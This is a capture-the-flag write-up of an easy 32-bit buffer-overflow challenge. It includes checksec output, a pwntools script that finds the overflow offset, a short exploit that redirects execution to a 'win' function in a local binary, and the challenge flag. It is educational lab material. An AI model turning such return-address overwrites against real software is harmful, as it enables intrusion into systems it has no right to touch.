---
title: "Basic Buffer Overflow"
description: "Exploiting a simple buffer overflow vulnerability"
date: 2026-01-04
ctf: "pwn"
category: "Pwn"
difficulty: "Easy"
points: 300
solves: 45
tags: ["Buffer Overflow", "Stack", "x86"]
---

## Challenge Description

A classic buffer overflow challenge where we need to overwrite the return address to redirect execution flow.

## Analysis

Running `checksec` on the binary:

```bash
$ checksec buffer-overflow
[*] '/path/to/buffer-overflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

No protections! This should be straightforward.

## Exploitation

First, I found the offset to overwrite the return address:

```python
from pwn import *

# Create pattern
pattern = cyclic(100)

# Run program
p = process('./buffer-overflow')
p.sendline(pattern)
p.wait()

# Get offset
core = p.corefile
offset = cyclic_find(core.read(core.esp, 4))
print(f"Offset: {offset}")
```

Then crafted the exploit:

```python
from pwn import *

offset = 64
win_addr = 0x08048486

payload = b"A" * offset
payload += p32(win_addr)

p = process('./buffer-overflow')
p.sendline(payload)
p.interactive()
```

## Flag

`FLAG{buff3r_0v3rfl0w_b451c5}`

## Key Takeaways

- Buffer overflows allow control of execution flow
- Stack layout understanding is crucial
- Modern protections make exploitation harder
